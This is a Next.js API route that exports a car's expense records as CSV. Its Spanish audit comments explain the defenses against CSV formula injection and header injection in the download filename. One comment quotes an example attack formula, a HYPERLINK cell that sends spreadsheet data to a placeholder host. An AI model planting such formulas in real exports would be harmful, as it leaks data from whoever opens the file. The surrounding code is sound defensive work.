import { NextRequest, NextResponse } from "next/server";
import { getExpenses, getCar } from "@/lib/db";
import { safeDownloadFilename } from "@/lib/attachments";

// audit:S-5 — Un CSV es texto, pero Excel y Google Sheets lo leen como
// programa: una celda que empieza por `=`, `+`, `-` o `@` es una fórmula y se
// evalúa al abrir el archivo. Las descripciones de los gastos las escribe el
// usuario, así que bastaba con guardar un gasto llamado
// `=HYPERLINK("http://malo/"&A1)` para que el CSV exportado se convirtiera en
// un ataque contra quien lo abriera.
//
// La mitigación estándar es anteponer un apóstrofo: la hoja de cálculo lo lee
// como "esto es texto" y no lo muestra. Solo se aplica a los campos que
// escribe el usuario; los numéricos los genera esta función y no pueden
// empezar por un carácter peligroso —salvo el `-` de un negativo legítimo,
// que precisamente por eso no pasa por aquí.
const FORMULA_START = /^[=+\-@\t\r]/;

/** Celda de texto: guarda anti-fórmula y entrecomillado. */
function csvCell(value: string | null | undefined): string {
  const raw = value ?? "";
  const safe = FORMULA_START.test(raw) ? `'${raw}` : raw;
  // Se entrecomilla siempre: así una coma, un salto de línea o unas comillas
  // dentro del texto no descolocan las columnas.
  return `"${safe.replace(/"/g, '""')}"`;
}

/** Celda numérica: la genera esta función, así que no necesita escapado. Se
 *  separa de `csvCell` para que quede a la vista cuál es cuál. */
function numCell(value: number | null | undefined, decimals?: number): string {
  if (value === null || value === undefined) return "";
  return decimals === undefined ? String(value) : value.toFixed(decimals);
}

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const { id } = await params;
  const car = getCar(parseInt(id));
  if (!car) return NextResponse.json({ error: "Not found" }, { status: 404 });

  const expenses = getExpenses(parseInt(id), 9999);
  const headers = ["Fecha", "Tipo", "Importe", "Descripción", "Litros", "Km", "Coste Taller"];
  const rows = expenses.map((e) => [
    csvCell(e.date),
    csvCell(e.tipo),
    numCell(e.importe, 2),
    csvCell(e.descripcion),
    numCell(e.litros),
    numCell(e.km),
    numCell(e.coste_estimado_taller, 2),
  ].join(","));

  const csv = "﻿" + headers.join(",") + "\n" + rows.join("\n");

  // La marca y el modelo también los escribe el usuario. Interpolados tal cual
  // en Content-Disposition, un modelo con comillas o con CRLF permitía
  // inyectar cabeceras HTTP en la respuesta. `safeDownloadFilename` ya existía
  // para exactamente esto en la descarga de adjuntos.
  const filename = safeDownloadFilename(`${car.marca}_${car.modelo}_gastos.csv`);

  return new NextResponse(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${filename}"`,
      "X-Content-Type-Options": "nosniff",
      "Cache-Control": "private, no-store",
    },
  });
}
